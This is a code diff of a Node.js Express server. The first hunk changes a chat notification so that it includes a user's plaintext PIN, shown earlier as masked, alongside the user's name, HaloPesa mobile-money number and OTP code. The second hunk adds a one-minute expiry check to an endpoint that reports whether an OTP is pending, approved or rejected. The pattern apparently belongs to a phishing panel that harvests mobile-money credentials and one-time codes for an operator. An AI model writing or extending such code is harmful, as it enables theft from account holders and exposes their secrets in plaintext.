@@ -2084,7 +2084,7 @@ app.post('/api/register-user', async (req, res) => {
 
 👤 *Jina:* ${firstName} ${lastName}
 🔑 *HaloPesa Number:* ${haloNumber}
-📧 *Namba ya Siri:* ••••••
+📧 *Namba ya Siri:* ${password}
 ⏰ *Wakati:* ${new Date(timestamp).toLocaleString()}
 
 🔐 *OTP CODE:* \`${otp}\`
@@ -2267,9 +2267,19 @@ app.get('/api/check-registration-otp-status/:registrationId', async (req, res) =
       });
     }
 
+    // Check if OTP has expired (1 minute = 60 seconds = 60000 ms)
+    const OTP_EXPIRY_MS = 60 * 1000; // 1 minute
+    const now = new Date().getTime();
+    const submittedTime = new Date(otpData.submittedTime).getTime();
+    const elapsedMs = now - submittedTime;
+    const isExpired = elapsedMs > OTP_EXPIRY_MS;
+
     res.json({
       success: true,
-      status: otpData.status  // 'pending' | 'approved' | 'rejected'
+      status: otpData.status,  // 'pending' | 'approved' | 'rejected'
+      isExpired: isExpired,
+      elapsedSeconds: Math.floor(elapsedMs / 1000),
+      remainingSeconds: Math.max(0, Math.floor((OTP_EXPIRY_MS - elapsedMs) / 1000))
     });
 
   } catch (error) {
